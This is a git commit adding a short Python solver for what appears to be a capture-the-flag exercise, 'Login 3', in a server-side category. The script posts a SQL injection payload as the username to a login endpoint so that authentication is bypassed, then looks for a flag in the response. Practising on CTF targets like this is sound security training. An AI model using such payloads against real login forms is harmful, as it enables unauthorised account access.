025c75fb46b2de3661bedc958dce8ba7d8ce4d3c
SAW <99191294+nicsaw@users.noreply.github.com>
2025-03-21 16:54:49 +1100

    Login 3

---
+++ ctf/3-Server-Side/login3.py
@@ -0,0 +1,18 @@
+import sys
+from pathlib import Path
+sys.path.append(str(Path(__file__).resolve().parent.parent))
+from utils import get_session, find_flag
+
+BASE_URL = "https://login.quoccacorp.com/v3"
+PAYLOAD = "' OR 1=1 LIMIT 1 OFFSET 1; -- "
+
+class Solver:
+    def __init__(self):
+        self.session = get_session()
+
+    def main(self):
+        response = self.session.post(BASE_URL, data={"username": PAYLOAD})
+        find_flag(response.text)
+
+if __name__ == "__main__":
+    Solver().main()
